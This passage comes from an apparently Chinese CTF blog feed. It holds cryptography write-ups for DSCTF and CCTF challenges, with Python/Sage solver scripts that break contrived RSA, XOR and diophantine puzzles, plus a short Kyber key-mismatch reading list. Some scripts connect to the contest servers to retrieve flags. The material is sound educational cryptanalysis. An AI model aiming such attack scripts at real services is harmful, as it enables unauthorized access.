    &#125;</span><br><span class="line">        base = <span class="built_in">multi</span>(base, base);</span><br><span class="line">        n &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans.m[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	ll n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">1</span>) cout &lt;&lt; <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>) cout &lt;&lt; <span class="number">2</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			cout &lt;&lt; <span class="built_in">fastpower</span>(n) &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>Key Mismatch Attack</title>
    <url>/2024/07/09/2024/Key-Mismatch-Attack/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="key-mismatch-attack">Key mismatch attack</h1>
<p>前几天打DownUnderCTF碰到了一个针对Kyber的key mismathc
attack。题目只给了一个若干次的解密oracle，最后还能恢复密钥，遂感觉很牛逼，于是研究一下:D</p>
<span id="more"></span>
<h2 id="related-papers">related papers</h2>
<ul>
<li>Misuse attacks on post-quantum cryptosystems. 2019</li>
<li>Assessment of the key-reuse resilience of NewHope. 2019</li>
<li>Complete attack on RLWE key exchange with reused keys, without
signal leakage. 2018</li>
<li>Do not bound to a single position: Near-Optimal multipositional
mismatch attacks against Kyber and Saber. 2022</li>
<li>Lattice reduction meets key-mismatch: New misuse attack on
Lattice-based NIST candidate KEMs. 2022</li>
<li>Improving key mismatch attack on NewHope with fewer queries.
2020</li>
<li>A complete and optimized key mismatch attack on NIST candidate
NewHope. 2019</li>
<li>An efficient key mismatch attack on the NIST second round candidate
Kyber. 2019</li>
<li>A systematic approach and analysis of key mismatch attacks on
lattice-based NIST candidate KEMs. 2021</li>
</ul>
]]></content>
      <categories>
        <category>Cryptoanalysis</category>
      </categories>
      <tags>
        <tag>PQC</tag>
        <tag>attack</tag>
      </tags>
  </entry>
  <entry>
    <title>DSCTF</title>
    <url>/2022/07/17/2022/DSCTF/</url>
    <content><![CDATA[<p>俺拉了</p>
<span id="more"></span>
<h1 id="picproblem">picproblem</h1>
<p>套娃，pell + 逆图片+已知dp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array, zeros, uint8</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line"><span class="comment"># n =  85413323752199019806030766630760449394238054889872415531186815348349883843039718091361611175963675771467536496812507338620957273406076058263122453235926619595761737396698699834116678598534261542535530241537247151318756003375573850725841254167462648747492270335084402716816450008370008491069875351593380154253</span></span><br><span class="line"><span class="comment"># dp =  1576424214336939000475035870826282526256046059505538052583882122452307602095912733650442447289122473348318614749578285418144935611098423641334952097553125</span></span><br><span class="line"><span class="comment"># c =  53653254613997095145108444611576166902006080900281661447007750088487109015427510365774527924664116641019490904245926171500894236952984157500461367769566121581870986304353174732328118576440353500038670030097108081972287049673200783198844842527470746431369314585103203118824985764754487936404004696485346196488</span></span><br><span class="line"><span class="comment"># e = 65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># for x in range(1, e):</span></span><br><span class="line"><span class="comment"># 	if(e*dp%x==1):</span></span><br><span class="line"><span class="comment"># 		p=(e*dp-1)//x+1</span></span><br><span class="line"><span class="comment"># 		if(n%p!=0):</span></span><br><span class="line"><span class="comment"># 			continue</span></span><br><span class="line"><span class="comment"># 		q=n//p</span></span><br><span class="line"><span class="comment"># 		phin=(p-1)*(q-1)</span></span><br><span class="line"><span class="comment"># d = gp.invert(e, phin)</span></span><br><span class="line"><span class="comment"># print(long_to_bytes(pow(c, d, n)))</span></span><br><span class="line"><span class="comment"># m = b&#x27;*********** kn = 8 **************&#x27;</span></span><br><span class="line">image = cv2.imread(<span class="string">&quot;flag.jpg&quot;</span>)</span><br><span class="line">img_gray = cv2.cvtColor(image,cv2.COLOR_RGB2GRAY)</span><br><span class="line">imagearray = array(img_gray)</span><br><span class="line">h = <span class="built_in">len</span>(imagearray)</span><br><span class="line">w = <span class="built_in">len</span>(imagearray[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pell</span>(<span class="params">N, numTry = <span class="number">1000</span></span>):</span><br><span class="line">    cf= continued_fraction(sqrt(N))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(numTry):</span><br><span class="line">        denom = cf.denominator(i)</span><br><span class="line">        numer = cf.numerator(i)</span><br><span class="line">        <span class="keyword">if</span> numer^<span class="number">2</span>-N*denom^<span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> numer,denom</span><br><span class="line">x, y = solve_pell(<span class="number">903751</span>, <span class="number">2000</span>)</span><br><span class="line">kn = <span class="number">8</span></span><br><span class="line">x = <span class="number">1524993807674193841904821512553946379967374698278296055158206699585083472817489721493862711615915407326315660670541801753616900039772802728925226091475860689682871555641241500183892397513037971186709123629077584204226084524811673794984687840178772052545441242927492902583547355565525538664836516589721942980577095421561886873928634330640979800040574060218872787212426630202508118484269553983399179155489583316400107655564222453437462724749097265122300644936717434151331633092585140183510349369422527440264746843972834927860065578557836150798690530172694679514231722613822246810010130005324032492360889531553803832398604563088256410481865243771216990603166993198935358471831328395618477974126824762560872337594997394218234427050399655270848385995088586420526886397320949350980406936200217112040971433660322179072288438842964957568719036794320203116263329623589339367497303140938070334557345834226085189140858264388063745189833584962825509843279678826240558480527560</span></span><br><span class="line">y = <span class="number">1604145232044543633656616254647708451166351104281510395737885491696385806407267633308545985473789119651681711082023113933085624628557168423578747544761597312012713558891523798820667618256495398479378172124019360339427592449217208805888502769358288779859969965560832505104388955091637704481336716722418336373334467787371085728212260231330510705797124224353810509272250940285165605853594811893804251478850270703294638335268305881655491870226553141286503109543313414279220480589704210363277523457948607498351377843904335637032510420141505975997452077477296326035048463179997347136990808017374750824810458605412236391952910679246288287664717533857743462935708681309073915761377477454479206054016260422865457862565353002789887917196437750618212918420129464330488021272187952177063175896447842395209693304502304253471733746765257510395226972224876277717457205220726240042035259947453816668460757995771018155703600926745905595162857982860955545877343914746294034180707</span></span><br><span class="line"><span class="keyword">assert</span> <span class="number">1301149798051259562945444365741194129602596348352064372203373</span>*<span class="built_in">pow</span>(x, <span class="number">2</span>) == <span class="number">1175915431138623881271508290982969935822476052419526528443170552123</span>*<span class="built_in">pow</span>(y, <span class="number">2</span>) + <span class="number">1301149798051259562945444365741194129602596348352064372203373</span></span><br><span class="line">x1 = <span class="built_in">round</span>(x/y*<span class="number">0.001</span>, <span class="number">16</span>)</span><br><span class="line">u1 = y*<span class="number">3650</span>/x</span><br><span class="line">x2 = <span class="built_in">round</span>(x/y*<span class="number">0.00101</span>, <span class="number">16</span>)</span><br><span class="line">u2 = y*<span class="number">3675</span>/x</span><br><span class="line">x3 = <span class="built_in">round</span>(x/y*<span class="number">0.00102</span>, <span class="number">16</span>)</span><br><span class="line">u3 = y*<span class="number">3680</span>/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line"><span class="built_in">print</span>(kt)</span><br><span class="line"><span class="built_in">print</span>(h, w)</span><br><span class="line"></span><br><span class="line">temp_image = zeros(shape=[h, w, <span class="number">3</span>], dtype=uint8)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image[<span class="number">0</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(temp_image[<span class="number">0</span>][<span class="number">1</span>]))</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, kn):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, w):</span><br><span class="line">            x1 = u1 * x1 * (<span class="number">1</span> - x1)</span><br><span class="line">            x2 = u2 * x2 * (<span class="number">1</span> - x2)</span><br><span class="line">            x3 = u3 * x3 * (<span class="number">1</span> - x3)</span><br><span class="line">            r1 = <span class="built_in">int</span>(x1 * <span class="number">255</span>)</span><br><span class="line">            r2 = <span class="built_in">int</span>(x2 * <span class="number">255</span>)</span><br><span class="line">            r3 = <span class="built_in">int</span>(x3 * <span class="number">255</span>)</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                temp_image[i][j][t] = (((r1 + r2) ^ r3) - imagearray[i][j]) % <span class="number">256</span></span><br><span class="line">    x1 = kt[<span class="number">0</span>]</span><br><span class="line">    x2 = kt[<span class="number">1</span>]</span><br><span class="line">    x3 = kt[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br></pre></td></tr></table></figure>
<h1 id="rsa330">RSA330</h1>
<p><a href="https://eprint.iacr.org/2022/271.pdf#:~:text=The%20point%20of%20approximate%20divisor%20multiples%20is%20that,we%20rely%20on%20a%20standard%20Coppersmith-%20type%20heuristic.">paper链接</a></p>
<p>哎本来能做出来的，最后一直copper不出来，也算督促自己了T-T</p>
<p>题目分三步，factor-用paper的方法求kl-copper</p>
<p>第二步和第三步不一定有解</p>
<p>copper最后得到的小范式单项式用基本方法、groebner都可以出解</p>
<h1 id="approximate">approximate</h1>
<p>RSA copper了一天，这题都没看。。复盘的时候发现不是很难 <span class="math display">\[
x_1 = p * pp\\
x_2 = q * qq\\
n = (p+x)*(q+y)\\
\because x、y\; is\;small\\
\therefore x_1x_2/n + x \approx pp*qq \;|\;x_1x_2
\]</span> 不过x的界要自己找</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>coppersmith</tag>
        <tag>RSA</tag>
        <tag>Pell Equation</tag>
      </tags>
  </entry>
  <entry>
    <title>CCTF</title>
    <url>/2022/07/17/2022/CCTF/</url>
    <content><![CDATA[<p>复盘咯</p>
<span id="more"></span>
<h1 id="warm-up">WARM-UP</h1>
<h2 id="mic-check">Mic Check</h2>
<p>点进去就有</p>
<h1 id="easy">EASY</h1>
<h2 id="klamkin">Klamkin</h2>
<p>求一元一次方程的解，给了一组x、y，直接移位就有了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;04.cr.yp.toc.tf&#x27;</span>, <span class="number">13777</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[Q]uit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;G&#x27;</span>)</span><br><span class="line">q = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line">r = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line">s = <span class="built_in">int</span>(io.recvline().split()[-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(q,r,s)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;[Q]uit\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;that &#x27;</span>)</span><br><span class="line">    u = io.recvuntil(<span class="string">b&#x27; &#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;is &#x27;</span>)</span><br><span class="line">    num = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;-&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="keyword">if</span> u == <span class="string">b&#x27;x&#x27;</span>:</span><br><span class="line">        inv = (gp.invert(r, q) * s) % q</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) + <span class="string">&#x27;, &#x27;</span> + <span class="built_in">str</span>((inv * (<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) % q)))</span><br><span class="line">    <span class="keyword">elif</span> u == <span class="string">b&#x27;y&#x27;</span>:</span><br><span class="line">        inv = (gp.invert(s, q) * r) % q</span><br><span class="line">        io.sendline(<span class="built_in">str</span>((inv * (<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)) % q)) + <span class="string">&#x27;, &#x27;</span> +  <span class="built_in">str</span>(<span class="number">1</span>&lt;&lt;(num - <span class="number">1</span>)))</span><br><span class="line">    io.recvline()</span><br><span class="line"><span class="comment">#CCTF&#123;f1nDin9_In7Eg3R_50Lut1Ons_iZ_in73rEStIn9!&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="baphomet">Baphomet</h2>
<p>’CCTF‘爆破key，截前面一部分key解密即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.enc&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">msg = <span class="string">&#x27;CCTF&#123;&#x27;</span></span><br><span class="line">ba = b64encode(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">baph = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> ba.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> b.islower():</span><br><span class="line">        baph += b.upper()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        baph += b.lower()</span><br><span class="line">baph = baph.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(baph)</span><br><span class="line">key = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(baph)):</span><br><span class="line">    key += (baph[i] ^ c[i]).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">key = key[:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    flag += (c[i] ^ key[i % <span class="built_in">len</span>(key)]).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag.decode(<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">    <span class="keyword">if</span> f.islower():</span><br><span class="line">        msg += f.upper()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        msg += f.lower()</span><br><span class="line">msg = msg.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64decode(msg))</span><br><span class="line"><span class="comment">#b&#x27;CCTF&#123;UpP3r_0R_lOwER_17Z_tH3_Pr0bL3M&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h1 id="medium-easy">MEDIUM-EASY</h1>
<h2 id="sots">sots</h2>
<p><code>He who abides far away from his home, is ever longing for the day he shall return.</code></p>
<p>求<span class="math display">\[x^2+y^2=n, n已知\]</span></p>
<p>丢番图方程，可以用<a href="https://www.alpertron.com.ar/QUAD.HTM">在线网站</a>解，也可以调库two_square()</p>
<p>梭了</p>
<p>CCTF{3Xpr3sS_4z_Th3_sUm_oF_7w0_Squ4rE5!}</p>
<h2 id="polyrsa">polyRSA</h2>
<p>直接roots</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">e = <span class="number">31337</span></span><br><span class="line">n = <span class="number">44538727182858207226040251762322467288176239968967952269350336889655421753182750730773886813281253762528207970314694060562016861614492626112150259048393048617529867598499261392152098087985858905944606287003243</span></span><br><span class="line">c = <span class="number">37578889436345667053409195986387874079577521081198523844555524501835825138236698001996990844798291201187483119265306641889824719989940722147655181198458261772053545832559971159703922610578530282146835945192532</span></span><br><span class="line"></span><br><span class="line">P = PolynomialRing(ZZ, <span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">k = P.gen()</span><br><span class="line">p = k**<span class="number">6</span> + <span class="number">7</span>*k**<span class="number">4</span> - <span class="number">40</span>*k**<span class="number">3</span> + <span class="number">12</span>*k**<span class="number">2</span> - <span class="number">114</span>*k + <span class="number">31377</span></span><br><span class="line">q = k**<span class="number">5</span> - <span class="number">8</span>*k**<span class="number">4</span> + <span class="number">19</span>*k**<span class="number">3</span> - <span class="number">313</span>*k**<span class="number">2</span> - <span class="number">14</span>*k + <span class="number">14011</span></span><br><span class="line">f = p*q -n</span><br><span class="line">x = f.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line"><span class="comment">#k = 9291098683758154336</span></span><br><span class="line">p = p(x)</span><br><span class="line">q = q(x)</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure>
<h2 id="infinity-castle">infinity castle</h2>
<p>diamond是平方，triage是立方，summarize是对<span class="math display">\[\sqrt{n}\]</span>进行积分，find是计算泰勒级数
<span class="math display">\[
summarize返回的值\approx \frac{\sqrt{2}}{2}
+\sqrt{3}+\sqrt{4}+···+\frac{\sqrt{n}}{2}\\
所以是\sqrt{n}从2到n的积分
\]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2  <span class="keyword">import</span> iroot</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">cip, key</span>):</span><br><span class="line">	repeation = <span class="number">1</span> + (<span class="built_in">len</span>(cip) // <span class="built_in">len</span>(key))</span><br><span class="line">	key = key * repeation</span><br><span class="line">	key = key[:<span class="built_in">len</span>(cip)]</span><br><span class="line">	</span><br><span class="line">	msg = <span class="built_in">bytes</span>([c ^^ k <span class="keyword">for</span> c, k <span class="keyword">in</span> <span class="built_in">zip</span>(cip, key)])</span><br><span class="line">	<span class="keyword">return</span> msg</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">diamond</span>(<span class="params">num</span>): <span class="comment">#平方</span></span><br><span class="line">	<span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">triage</span>(<span class="params">num</span>):<span class="comment">#立方</span></span><br><span class="line">	<span class="keyword">return</span> num ** <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">summarize</span>(<span class="params">b</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="number">2</span>/<span class="number">3</span> * b**(<span class="number">3</span>/<span class="number">2</span>) - <span class="number">2</span>/<span class="number">3</span> * <span class="number">2</span>**(<span class="number">3</span>/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">c0 = <span class="number">194487778980461745865921475300460852453586088781074246328543689440168930873549359227127363759885970436167330043371627413542337857082400024590112412164095470165662281502211335756288082198009158469871465280749846525326701136380764079685636158337203211609233704905784093776008350120607841177268965738426317288541638374141671346404729428158104872411498098187946543666987926130124245185069569476433120128275581891425551325847219504501925282012199947834686225770246801353666030075146469275695499044424390475398423700504158154044180028733800154044746648133536737830623670383925046006108348861714435567006327619892239876863209887013290251890513192375749866675256952802329688897844132157098061758362137357387787072005860610663777569670198971946904157425377235056152628515775755249828721767845990597859165193162537676147173896835503209596955703313430433124688537275895468076469102220355973904702901083642275544954262724054693167603475188412046722656788470695566949847884250306735314144182029335732280420629131990311054229665691517003924788583771265625694414774865289407885678238795596912006567817508035434074250123869676396153982762032750080222602796273083162627489526255501643913672882350236497429678928099868244687228703074267962827621792960</span></span><br><span class="line">c1 = <span class="number">102325064080381160170299055162846304227217463467232681115953623386548494169967745781550171804781503102663445039561476870208178139548389771866145006535051362059443515034504958703659546162037904784821960707630188600064568878674788077706711506213779443920430038560373854184526850365974450688458342413544179732143225845085164110594063440979455274250021370090572731855665413325275414458572412561502408983107820534723804225765540316307539962199024757378469001612921489902325166003841336027940632451584642359132723894801946906069322200784708303615779699081247051006259449466759863245508473429631466831174013498995506423210088549372249221415401309493511477847517923201080509933268996867995533386571564898914042844521373220497356837599443280354679778455765441375957556266205953496871475611269965949025704864246188576674107448587696941054123618319505271195780178776338475090463487960063464172195337956577785477587755181298859587398321270677790915227557908728226236404532915215698698185501562405374498053670694387354757252731874312411228777004316623425843477845333936913444143768519959591070492639650368662529749434618783626718975406802741753688956961837855306815380844030665696781685152837849982159679122660714556706669865596780528277684800454866433826417980212164051043504955615794706595412705883261111953152250227679858538249797999044336210905975316421254442221408945203647754303635775048438188044803368249944201671941949138202928389951227347433255867504906597772044398973241425387514239164853656233776024571606159378910745571588836981735827902305330330946219857271646498602227088657739442867033212012876837654750348578740516798444734534291467314881324902354425889448102902750077077381896216130734894767553834949561471219923459897244690006643798812989271282475503126962274052192342840870308710338336817452628324667507548265612892611100350882163205858101959976</span></span><br><span class="line">enc = <span class="number">122235247669762131006183252122503937958296387791525458429403709404875223067116491817728568224832483391622109986550732469556761300197133827976956875865159629512476600711420561872409721582387803219651736262581445978042694384374119142613277808898398213602093802571586386354257378956087240174787723503606671543195193114158641301908622673736098768829071270132073818245595918660134745516367731595853832524328488074054536278197115937409643221809577554866060292157239061557708159310445977052686561229611117673473208278176118561352693319461471419694590218295911647368543698198762827636021268989705079848502749837879584394379300566277359149621932579222865430374652678738198451655509408564586496375811666876030847654260305392984710580761255795785508407844683687773983669843744274915862335181251050775093896006210092665809300090715190088851654138383362259256212093670748527819287681468901379286722214112321906917311154811516336259463356911326393701445497605365038857575515541024824906818473933597129846235905072394148879079996812146836910199111439031562946495046766063326815863624262541346543552652673629442370320109404700346028639853707278295255350982238521659924641921142615894039995513480511108116053798143154593343124822462519555715118822045</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">pandq = iroot(c1,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> c0 % pandq == <span class="number">0</span></span><br><span class="line">p_q = c0 // pandq</span><br><span class="line">p = (pandq + p_q) // <span class="number">2</span></span><br><span class="line">q = pandq - p</span><br><span class="line"><span class="keyword">assert</span> c1 == (p + q) ** <span class="number">3</span></span><br><span class="line">n = <span class="built_in">int</span>(p * q)</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">xor_key = long_to_bytes(<span class="built_in">int</span>(summarize(n)))</span><br><span class="line">enc = long_to_bytes(<span class="built_in">pow</span>(enc, d, n))</span><br><span class="line">flag = xor(enc, xor_key) </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#CCTF&#123;Mix1ng_c4lcUluS_w17h_Numb3r_The0Rry_S33ms_s7r0ng_cRyp70_Sch3m4!!&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="keydream">keydream</h2>
<p>给两头的copper</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">23087202318856030774680571525957068827041569782431397956837104908189620961469336659300387982516148407611623358654041246574100274275974799587138270853364165853708786079644741407579091918180874935364024818882648063256767259283714592098555858095373381673229188828791636142379379969143042636324982275996627729079</span></span><br><span class="line">c = <span class="number">3621516728616736303019716820373078604485184090642291670706733720518953475684497936351864366709813094154736213978864841551795776449242009307288704109630747654430068522939150168228783644831299534766861590666590062361030323441362406214182358585821009335369275098938212859113101297279381840308568293108965668609</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p_high = bytes_to_long(<span class="string">b&#x27;CCTF&#123;it_is_fake_flag_&#x27;</span>)</span><br><span class="line">p_low = bytes_to_long(<span class="string">b&#x27;_90OD_luCk___!!&#125;&#x27;</span>)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = p_high * <span class="number">2</span>^(<span class="number">43</span>*<span class="number">8</span>) + x * <span class="number">2</span>^(<span class="number">16</span>*<span class="number">8</span>) + p_low</span><br><span class="line">roots = f.monic().small_roots(X = <span class="number">2</span>^(<span class="number">27</span>*<span class="number">8</span>), beta = <span class="number">0.4</span>)</span><br><span class="line">p = <span class="built_in">int</span>(f(roots[<span class="number">0</span>]))</span><br><span class="line"><span class="keyword">assert</span> n%p == <span class="number">0</span></span><br><span class="line">q = n//p</span><br><span class="line">d = inverse_mod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;Congratz, the flag is: CCTF&#123;h0M3_m4dE_k3Y_Dr1vEn_CrYp7O_5ySTeM!&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="jeksign">jeksign</h2>
<p><span class="math display">\[
1337(z^4 - x^2) = 31337(y^2 - z^4)\\
a(z^4 - x^2) = b(y^2 - z^4)\\
\therefore (a+b)z^4 = ax^2+by^2\\
令x=y=z^2，得到恒等式
\]</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">nc = remote(<span class="string">&#x27;02.cr.yp.toc.tf&#x27;</span>, <span class="number">17113</span>)</span><br><span class="line">x = <span class="number">30</span></span><br><span class="line">nc.recvuntil(<span class="string">b&#x27;-bit: \n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    z = randint(<span class="number">2</span> ** (x-<span class="number">1</span>), <span class="number">2</span> ** x)</span><br><span class="line">    <span class="built_in">print</span>(z)</span><br><span class="line">    nc.sendline(<span class="built_in">str</span>(z**<span class="number">2</span>)+<span class="string">&#x27;,&#x27;</span>+<span class="built_in">str</span>(z**<span class="number">2</span>)  + <span class="string">&#x27;,&#x27;</span> + <span class="built_in">str</span>(z))</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line">    nc.recvline()</span><br><span class="line"><span class="comment">#CCTF&#123;4_diOpH4nT1nE_3Qua7i0n__8Y__Jekuthiel_Ginsbur!!&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="volgo">volgo</h2>
<p>明文密文一一对应，直接爆破</p>
<p>下面的exp是苏氨酸师傅的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_uppercase</span><br><span class="line"></span><br><span class="line">ct = <span class="string">&#x27;NUYXA FATCL LJSVD KOLWM NWZUG JZDPY JGOSL CBRGO BAMKL BXDZR BLXDU KUNQE CWEUO SPOZR VOJMM POXCR RPNXX SGVHW TGOWJ BDOGF AHVWF WPZGR UQKUE HASEF GKFFA QOPNQ TESLZ FACTJ JPSPL DNZYN CXSFZ&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rua</span>(<span class="params">c, i</span>):</span><br><span class="line">    pre = <span class="string">&quot;A&quot;</span> * i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> ascii_uppercase:</span><br><span class="line">        cipher = 